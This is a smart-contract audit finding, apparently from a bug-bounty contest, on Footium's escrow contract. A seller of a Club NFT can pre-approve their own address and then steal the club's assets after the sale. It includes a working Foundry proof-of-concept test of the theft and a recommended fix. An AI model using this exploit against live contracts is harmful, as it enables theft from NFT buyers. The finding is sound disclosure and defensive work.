# Previous owner of the club could steal club inventory 

## Summary
Previous owner of the Club NFT had the ability to steal any assets held in the Club's escrow contract by approving their own address prior to transferring the Club NFT.

## Vulnerability Detail
Each Club NFT is associated with an Escrow contract that is responsible for holding and transferring the Club's inventory of NFTs (such as players) and tokens (such as Footium Token). The current Club owner can approve any address to transfer ERC20 and ERC721 tokens from the escrow (=club balance) using this contract.
As Clubs NFTs follow the ERC721 standard, they can be traded freely on secondary markets. However, this creates an attack vector where the seller of the Club can approve their own address as the operator of Club assets, sell the Club NFT, and withdraw Club assets after a successful trade. This is because approvals on the escrow contract do not get revoked after changing the Club owner.

## Impact
The new Club owner risks losing all assets stored in the escrow contract as previous owners can withdraw these assets by pre-approving their own address before transferring Club ownership.

## Code Snippet
Functions that allow the current owner (seller) to approve addresses to transfer assets from `Escrow` balance:

https://github.com/sherlock-audit/2023-04-footium/blob/main/footium-eth-shareable/contracts/FootiumEscrow.sol#L75-L96
```solidity
    /**
     * @notice Sets approval for ERC20 tokens.
     * @param erc20Contract ERC20 contract address.
     * @param to The address of token spender.
     * @param amount Token amount to spend.
     * @dev only the club owner address allowed.
     */
    function setApprovalForERC20(
        IERC20 erc20Contract,
        address to,
        uint256 amount
    ) external onlyClubOwner {
        erc20Contract.approve(to, amount); 
    }

    /**
     * @notice Sets approval for ERC721 tokens.
     * @param erc721Contract ERC721 contract address.
     * @param to The address of token spender.
     * @param approved Boolean flag indicating whether approved or not.
     * @dev only the club owner address allowed.
     */
    function setApprovalForERC721(
        IERC721 erc721Contract,
        address to,
        bool approved
    ) external onlyClubOwner {
        erc721Contract.setApprovalForAll(to, approved);
    }
```
## PoC
Next Foundry test added in file `test/foundry/Footium.t.sol` could show a possible attack scenario:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../contracts/FootiumClub.sol";
import "../../contracts/FootiumPlayer.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

contract CounterTest is Test {
    FootiumClub public club;
    FootiumPlayer public player;
    address buyer;
    address maliciousSeller;
    address secondaryMarket;

    function setUp() public {
        club = new FootiumClub();
        club.initialize("URL");
        player = new FootiumPlayer();
        player.initialize(address(123), 1, "URL");

        club.grantRole(club.MINTER_ROLE(), address(this));
        player.grantRole(club.MINTER_ROLE(), address(this));

        maliciousSeller = makeAddr("maliciousSeller");
        buyer = makeAddr("buyer");
        secondaryMarket = makeAddr("secondaryMarket");
    }

    function testStealingAfterTrade() public {
        // Minting club NFT for malicious seller and player NFT that would hold on clubs' escrow contract
        uint256 clubId = 1;
        club.safeMint(maliciousSeller, clubId);
        uint256 playerId;
        playerId = player.safeMint(address(club.clubToEscrow(clubId)));

        vm.startPrank(maliciousSeller);
        // Seller approves own address to be able to transfer players' NFT after trade of club NFT
        FootiumEscrow(club.clubToEscrow(clubId)).setApprovalForERC721(IERC721(address(player)), maliciousSeller, true);
        // Seller approve club NFT for secondary market to by traded
        club.approve(secondaryMarket, clubId);
        vm.stopPrank();
        // Trading tx
        vm.prank(secondaryMarket);
        club.transferFrom(maliciousSeller, buyer, clubId);
        // Checking that buyer now owns clubs' NFT
        require(club.ownerOf(clubId) == buyer);
        // Seller steal player NFT by transfer to own address since its still approved
        vm.startPrank(maliciousSeller);
        player.transferFrom(address(club.clubToEscrow(clubId)), maliciousSeller, playerId);
        vm.stopPrank();
        // Checking that seller owns player NFT after trade of club was executed
        assertEq(player.ownerOf(playerId), maliciousSeller);
    }
}
```
Check this link for instructions on how to add Foundry tests in the Hardhat project:

https://book.getfoundry.sh/config/hardhat#4-steps-to-add-foundry-test

## Tool used
Manual Review

## Recommendation
One possible solution to mitigate the risk of fraud for Club NFT buyers is to either remove the transfer possibility from the Club NFT contract altogether or explicitly warn potential buyers to check current approvals on the escrow contract and revoke any after buying.

## Link to origin issue
https://github.com/sherlock-audit/2023-04-footium-judging/issues/180